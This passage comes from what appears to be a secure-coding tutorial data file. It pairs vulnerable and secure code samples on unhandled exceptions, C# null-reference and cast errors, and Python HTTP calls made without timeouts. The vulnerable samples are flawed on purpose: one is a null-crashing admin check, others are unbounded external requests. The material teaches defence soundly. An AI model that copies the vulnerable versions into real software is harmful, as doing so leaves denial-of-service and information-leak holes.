      referenceId: crypto.randomUUID()
    });
  }
});

// Global safety net (last resort)
process.on('unhandledRejection', (reason) => {
  logger.critical({ event: 'UNHANDLED_REJECTION', reason });
  // Graceful shutdown instead of hard crash
});`,
      },
      {
        title: "Type Coercion / Null Safety Errors",
        vulnerableCode: `// C# — Vulnerable: Null reference and type errors
public class DiscountService
{
    public decimal ApplyDiscount(string code, object amount)
    {
        // No null check — NullReferenceException if code is null
        if (code.ToUpper() == "VIP")
        {
            // No type validation on amount
            var discount = (decimal)amount;  // InvalidCastException
            return discount * 0.8m;
        }
        return (decimal)amount;
    }

    public bool IsAdmin(User user)
    {
        // If user.Role is null, this throws NullReferenceException
        // Crashing the request instead of denying access
        return user.Role.ToLower() == "admin";
    }

    public string GetUserEmail(int userId)
    {
        var user = db.Users.Find(userId);
        // If user is null, NullReferenceException!
        return user.Email;
        // Unhandled exception → 500 with stack trace
    }
}

// Each unhandled exception potentially:
// 1. Crashes the request handler
// 2. Exposes stack trace to the client
// 3. Leaves the system in an inconsistent state`,
        secureCode: `// C# — Secure: Null safety + explicit type validation
public class DiscountService
{
    public Result<decimal> ApplyDiscount(string? code, object? amount)
    {
        // Explicit null and type checks
        if (string.IsNullOrWhiteSpace(code))
            return Result<decimal>.Fail("Discount code is required");

        if (amount is not decimal validAmount)
            return Result<decimal>.Fail("Amount must be a decimal");

        if (validAmount <= 0 || validAmount > 10000)
            return Result<decimal>.Fail("Amount out of valid range");

        if (code.Equals("VIP", StringComparison.OrdinalIgnoreCase))
            return Result<decimal>.Ok(validAmount * 0.8m);

        return Result<decimal>.Ok(validAmount);
    }

    public bool IsAdmin(User? user)
    {
        // Null-safe: returns false (fail closed) if anything is null
        return string.Equals(
            user?.Role, "admin",
            StringComparison.OrdinalIgnoreCase
        );
    }

    public Result<string> GetUserEmail(int userId)
    {
        var user = db.Users.Find(userId);
        if (user is null)
            return Result<string>.Fail("User not found");

        return Result<string>.Ok(user.Email ?? "");
    }
}

// Every method returns a Result instead of throwing
// No unhandled exceptions, no stack traces leaked
// Null references are handled gracefully`,
      },
      {
        title: "No Timeout on External Calls",
        vulnerableCode: `# Python — Vulnerable: No timeout on external service calls
import requests

def get_user_profile(user_id):
    # If the service hangs, this waits FOREVER
    response = requests.get(
        f"https://api.external.com/users/{user_id}"
    )
    return response.json()

def process_payment(order):
    # Payment API hangs → request hangs → thread blocked
    result = requests.post(
        "https://payments.example.com/charge",
        json=order
    )
    return result.json()

# Consequences of no timeouts:
# 1. One slow service cascades to entire application
# 2. Thread pool exhaustion — no new requests handled
# 3. Memory grows as pending requests accumulate
# 4. User sees infinite loading spinner
# 5. Attackers can exploit: slow requests = easy DoS
# 6. Gunicorn/uWSGI worker timeout kills the process`,
        secureCode: `# Python — Secure: Timeouts + circuit breaker pattern
import requests
from circuitbreaker import circuit

# Always set timeouts on ALL external calls
def get_user_profile(user_id):
    try:
        response = requests.get(
            f"https://api.external.com/users/{user_id}",
            timeout=(3, 10)  # (connect_timeout, read_timeout)
        )
        response.raise_for_status()
        return response.json()

    except requests.Timeout:
        logger.warning("EXTERNAL_TIMEOUT", extra={
            "service": "user-api",
            "user_id": user_id
        })
        # Return cached/fallback data instead of failing
        return get_cached_profile(user_id) or {"name": "Unknown"}

    except requests.RequestException as e:
        logger.error("EXTERNAL_ERROR", extra={
            "service": "user-api",
            "error": str(e)
        })
        raise ServiceUnavailableError("User service unavailable")

# Circuit breaker: stop calling a failing service
@circuit(failure_threshold=5, recovery_timeout=30)
def process_payment(order):
    response = requests.post(
        "https://payments.example.com/charge",
        json=order,
        timeout=(3, 15)
    )
    response.raise_for_status()
    return response.json()

# After 5 failures in a row:
# - Circuit breaker OPENS — calls fail immediately
# - No more requests sent to the failing service
# - After 30 seconds, one test request is allowed
# - If it succeeds, circuit CLOSES (normal operation)`,
      },
    ],
  },
];
